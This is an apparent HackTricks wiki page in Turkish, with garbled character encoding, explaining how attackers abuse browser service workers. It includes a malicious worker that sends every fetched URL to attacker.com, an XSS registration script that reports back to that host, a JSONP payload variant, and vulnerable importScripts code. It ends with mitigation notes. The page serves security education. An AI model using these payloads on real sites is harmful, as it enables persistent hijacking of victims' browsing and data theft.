# Service Worker'larÄ± KÃ¶tÃ¼ye Kullanma



{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** bizi takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

## Temel Bilgiler

Bir **service worker**, tarayÄ±cÄ±nÄ±z tarafÄ±ndan arka planda, herhangi bir web sayfasÄ±ndan ayrÄ± olarak Ã§alÄ±ÅŸan bir betiktir. Web sayfasÄ± veya kullanÄ±cÄ± etkileÅŸimi gerektirmeyen Ã¶zellikleri etkinleÅŸtirerek **Ã§evrimdÄ±ÅŸÄ± ve arka plan iÅŸleme** yeteneklerini artÄ±rÄ±r. Service worker'lar hakkÄ±nda ayrÄ±ntÄ±lÄ± bilgi [burada](https://developers.google.com/web/fundamentals/primers/service-workers) bulunabilir. KÄ±rÄ±lgan bir web alanÄ±nda service worker'larÄ± kÃ¶tÃ¼ye kullanarak, saldÄ±rganlar kurbanÄ±n o alan iÃ§indeki tÃ¼m sayfalarla etkileÅŸimlerini kontrol edebilir.

### Mevcut Service Worker'larÄ± Kontrol Etme

Mevcut service worker'lar, **GeliÅŸtirici AraÃ§larÄ±**'ndaki **Uygulama** sekmesinde **Service Workers** bÃ¶lÃ¼mÃ¼nde kontrol edilebilir. DiÄŸer bir yÃ¶ntem ise daha ayrÄ±ntÄ±lÄ± bir gÃ¶rÃ¼nÃ¼m iÃ§in [chrome://serviceworker-internals](https://chromium.googlesource.com/chromium/src/+/main/docs/security/chrome%3A/serviceworker-internals) adresini ziyaret etmektir.

### Push Bildirimleri

**Push bildirim izinleri**, bir **service worker**'Ä±n sunucu ile doÄŸrudan kullanÄ±cÄ± etkileÅŸimi olmadan iletiÅŸim kurma yeteneÄŸini doÄŸrudan etkiler. Ä°zinler reddedilirse, service worker'Ä±n sÃ¼rekli bir tehdit oluÅŸturma potansiyelini sÄ±nÄ±rlar. Tersine, izinlerin verilmesi, potansiyel istismarlarÄ±n alÄ±nmasÄ±nÄ± ve yÃ¼rÃ¼tÃ¼lmesini saÄŸlayarak gÃ¼venlik risklerini artÄ±rÄ±r.

## Service Worker OluÅŸturma SaldÄ±rÄ±sÄ±

Bu aÃ§Ä±ÄŸÄ± kÃ¶tÃ¼ye kullanmak iÃ§in ÅŸunlarÄ± bulmanÄ±z gerekir:

* Sunucuya **keyfi JS** dosyalarÄ± **yÃ¼klemenin** bir yolunu ve yÃ¼klenen JS dosyasÄ±nÄ±n **service worker'Ä±nÄ± yÃ¼klemek iÃ§in bir XSS**
* Ã‡Ä±ktÄ±yÄ± **manipÃ¼le edebileceÄŸiniz** bir **kÄ±rÄ±lgan JSONP isteÄŸi** (keyfi JS kodu ile) ve **kÃ¶tÃ¼ niyetli bir service worker'Ä± yÃ¼kleyecek bir yÃ¼k ile JSONP'yi yÃ¼klemek iÃ§in bir XSS**.

AÅŸaÄŸÄ±daki Ã¶rnekte, `fetch` olayÄ±nÄ± dinleyecek ve **her alÄ±nan URL'yi saldÄ±rganÄ±n sunucusuna gÃ¶nderecek** bir **yeni service worker kaydetmek iÃ§in** bir kod sunacaÄŸÄ±m (bu, **sunucuya** **yÃ¼klemeniz** veya bir **kÄ±rÄ±lgan JSONP** yanÄ±tÄ± aracÄ±lÄ±ÄŸÄ±yla yÃ¼klemeniz gereken koddur):
```javascript
self.addEventListener('fetch', function(e) {
e.respondWith(caches.match(e.request).then(function(response) {
fetch('https://attacker.com/fetch_url/' + e.request.url)
});
```
Ve bu, **iÅŸÃ§iyi kaydedecek** koddur (bu kodu bir **XSS** istismar ederek Ã§alÄ±ÅŸtÄ±rabilmelisiniz). Bu durumda, **hÃ¼cum edenlerin** sunucusuna **kaydÄ±** baÅŸarÄ±lÄ± olup olmadÄ±ÄŸÄ±nÄ± **bildiren** bir **GET** isteÄŸi gÃ¶nderilecektir:
```javascript
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
.then(function(registration) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/success", true);
xhttp2.send();
}, function (err) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/error", true);
xhttp2.send();
});
});
</script>
```
JSONP uÃ§ noktasÄ±nÄ± istismar etme durumunda, deÄŸeri `var sw` iÃ§ine koymalÄ±sÄ±nÄ±z. Ã–rneÄŸin:
```javascript
var sw = "/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//";
```
Bir **C2**, bu gÃ¼venlik aÃ§Ä±klarÄ±nÄ± istismar etmek iÃ§in **Service Workers**'a adanmÄ±ÅŸ [**Shadow Workers**](https://shadow-workers.github.io) bulunmaktadÄ±r ve bu, bu gÃ¼venlik aÃ§Ä±klarÄ±nÄ± istismar etmek iÃ§in Ã§ok faydalÄ± olacaktÄ±r.

**24 saatlik Ã¶nbellek direktifi**, kÃ¶tÃ¼ niyetli veya tehlikeye girmiÅŸ bir **service worker (SW)**'Ä±n Ã¶mrÃ¼nÃ¼, Ã§evrimiÃ§i istemci durumu varsayÄ±larak, bir XSS gÃ¼venlik aÃ§Ä±ÄŸÄ± dÃ¼zeltmesinden sonra en fazla 24 saat ile sÄ±nÄ±rlar. GÃ¼venliÄŸi en aza indirmek iÃ§in, site operatÃ¶rleri SW betiÄŸinin YaÅŸam SÃ¼resi'ni (TTL) dÃ¼ÅŸÃ¼rebilir. GeliÅŸtiricilere ayrÄ±ca hÄ±zlÄ± devre dÄ±ÅŸÄ± bÄ±rakma iÃ§in bir [**service worker kill-switch**](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776) oluÅŸturmalarÄ± Ã¶nerilir.

## DOM Clobbering ile bir SW'de `importScripts`'i Ä°stismar Etme

Bir Service Worker'dan Ã§aÄŸrÄ±lan **`importScripts`** fonksiyonu, **farklÄ± bir alandan bir betik iÃ§e aktarabilir**. EÄŸer bu fonksiyon, bir **saldÄ±rganÄ±n** deÄŸiÅŸtirebileceÄŸi bir **parametre** kullanÄ±larak Ã§aÄŸrÄ±lÄ±rsa, saldÄ±rgan **kendi alanÄ±ndan bir JS betiÄŸi iÃ§e aktarabilir** ve XSS elde edebilir.

**Bu, CSP korumalarÄ±nÄ± da aÅŸar.**

**Ã–rnek savunmasÄ±z kod:**

* **index.html**
```html
<script>
navigator.serviceWorker.register('/dom-invader/testcases/augmented-dom-import-scripts/sw.js' + location.search);
// attacker controls location.search
</script>
```
* **sw.js**
```javascript
const searchParams = new URLSearchParams(location.search);
let host = searchParams.get('host');
self.importScripts(host + "/sw_extra.js");
//host can be controllable by an attacker
```
### DOM Clobbering ile

DOM Clobbering'in ne olduÄŸu hakkÄ±nda daha fazla bilgi iÃ§in kontrol edin:

{% content-ref url="dom-clobbering.md" %}
[dom-clobbering.md](dom-clobbering.md)
{% endcontent-ref %}

EÄŸer SW'nin **`importScripts`** Ã§aÄŸrÄ±sÄ± yaptÄ±ÄŸÄ± URL/domain **bir HTML Ã¶ÄŸesinin iÃ§indeyse**, bu **DOM Clobbering aracÄ±lÄ±ÄŸÄ±yla deÄŸiÅŸtirilmesi mÃ¼mkÃ¼ndÃ¼r** ve SW'nin **kendi domaininizden bir script yÃ¼klemesini saÄŸlar**.

Bunun bir Ã¶rneÄŸi iÃ§in referans baÄŸlantÄ±sÄ±na bakÄ±n.

## Referanslar

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
